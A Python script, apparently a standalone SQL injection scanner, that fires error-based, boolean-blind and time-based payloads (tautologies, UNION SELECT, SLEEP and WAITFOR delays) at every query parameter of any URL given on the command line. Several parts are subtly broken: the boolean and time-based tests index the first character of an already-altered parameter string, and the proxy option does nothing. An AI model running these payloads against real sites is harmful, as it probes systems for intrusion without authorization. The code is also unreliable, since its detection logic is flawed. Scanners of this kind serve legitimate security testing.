#!/usr/bin/env python3
"""
SQL Injection Scanner
Detects SQL injection vulnerabilities in web applications
"""

import requests
import sys
import argparse
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import time

# SQL injection test payloads
PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "')) OR (('1'='1",
    "1' AND 1=1 --",
    "1' AND 1=2 --",
    "1' OR sleep(5) --",
    "1' AND sleep(5) --",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "1' UNION SELECT NULL --",
    "1' UNION SELECT NULL,NULL --",
    "1' UNION SELECT NULL,NULL,NULL --",
]

# Error signatures that indicate SQL injection
ERROR_SIGNATURES = [
    "sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "pg_query",
    "pg_exec",
    "sqlite_query",
    "sqlite3",
    "ORA-",
    "Microsoft OLE DB",
    "ODBC SQL Server Driver",
    "SQLServer JDBC Driver",
    "SqlException",
    "syntax error",
    "unclosed quotation",
    "quoted string not properly terminated",
]


def detect_error_based(url, param, payload, original_response):
    """Detect SQL injection based on error messages"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if param not in params:
        return False, None
    
    params[param] = payload
    new_query = urlencode(params, doseq=True)
    test_url = parsed._replace(query=new_query).geturl()
    
    try:
        response = requests.get(test_url, timeout=10)
        response_text = response.text.lower()
        
        for signature in ERROR_SIGNATURES:
            if signature in response_text:
                return True, f"Error-based SQLi detected: {signature}"
        
        return False, None
    except Exception as e:
        return False, str(e)


def detect_boolean_based(url, param, original_response):
    """Detect boolean-based blind SQL injection"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if param not in params:
        return False, None
    
    # Test with AND 1=1 (should be true)
    params[param] = params[param][0] + "' AND '1'='1"
    new_query = urlencode(params, doseq=True)
    true_url = parsed._replace(query=new_query).geturl()
    
    # Test with AND 1=2 (should be false)
    params[param] = params[param][0] + "' AND '1'='2"
    new_query = urlencode(params, doseq=True)
    false_url = parsed._replace(query=new_query).geturl()
    
    try:
        true_response = requests.get(true_url, timeout=10)
        false_response = requests.get(false_url, timeout=10)
        
        # If responses differ significantly, likely boolean-based SQLi
        if len(true_response.text) != len(false_response.text):
            return True, "Boolean-based blind SQLi detected"
        
        return False, None
    except Exception as e:
        return False, str(e)


def detect_time_based(url, param):
    """Detect time-based blind SQL injection"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if param not in params:
        return False, None
    
    # Test with SLEEP/UNION SELECT
    sleep_payloads = [
        params[param][0] + "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        params[param][0] + "' AND SLEEP(5) --",
        params[param][0] + "'; WAITFOR DELAY '0:0:5' --",
    ]
    
    for payload in sleep_payloads:
        params[param] = payload
        new_query = urlencode(params, doseq=True)
        test_url = parsed._replace(query=new_query).geturl()
        
        try:
            start = time.time()
            response = requests.get(test_url, timeout=10)
            elapsed = time.time() - start
            
            if elapsed > 4:  # If response took > 4 seconds
                return True, f"Time-based blind SQLi detected (delay: {elapsed:.2f}s)"
        except requests.Timeout:
            return True, "Time-based blind SQLi detected (timeout)"
        except Exception:
            continue
    
    return False, None


def scan_url(url):
    """Scan a URL for SQL injection vulnerabilities"""
    print(f"[*] Scanning: {url}")
    
    try:
        original_response = requests.get(url, timeout=10)
    except Exception as e:
        print(f"[!] Error accessing URL: {e}")
        return []
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print("[!] No parameters found in URL")
        return []
    
    vulnerabilities = []
    
    for param in params:
        print(f"\n[*] Testing parameter: {param}")
        
        # Test error-based
        for payload in PAYLOADS[:5]:  # Test basic payloads first
            is_vuln, message = detect_error_based(url, param, payload, original_response)
            if is_vuln:
                print(f"[+] {message}")
                vulnerabilities.append({
                    "param": param,
                    "type": "Error-based SQLi",
                    "payload": payload,
                    "message": message
                })
                break
        
        # Test boolean-based
        is_vuln, message = detect_boolean_based(url, param, original_response)
        if is_vuln:
            print(f"[+] {message}")
            vulnerabilities.append({
                "param": param,
                "type": "Boolean-based Blind SQLi",
                "payload": "' AND '1'='1 / '1'='2",
                "message": message
            })
        
        # Test time-based
        is_vuln, message = detect_time_based(url, param)
        if is_vuln:
            print(f"[+] {message}")
            vulnerabilities.append({
                "param": param,
                "type": "Time-based Blind SQLi",
                "payload": "SLEEP(5)",
                "message": message
            })
    
    return vulnerabilities


def main():
    parser = argparse.ArgumentParser(description="SQL Injection Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    
    args = parser.parse_args()
    
    if args.proxy:
        requests.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    
    vulnerabilities = scan_url(args.url)
    
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    if vulnerabilities:
        print(f"\n[!] Found {len(vulnerabilities)} SQL injection vulnerability(s):\n")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"  {i}. Parameter: {vuln['param']}")
            print(f"     Type: {vuln['type']}")
            print(f"     Payload: {vuln['payload']}")
            print(f"     Details: {vuln['message']}")
            print()
    else:
        print("\n[+] No SQL injection vulnerabilities detected")


if __name__ == "__main__":
    main()
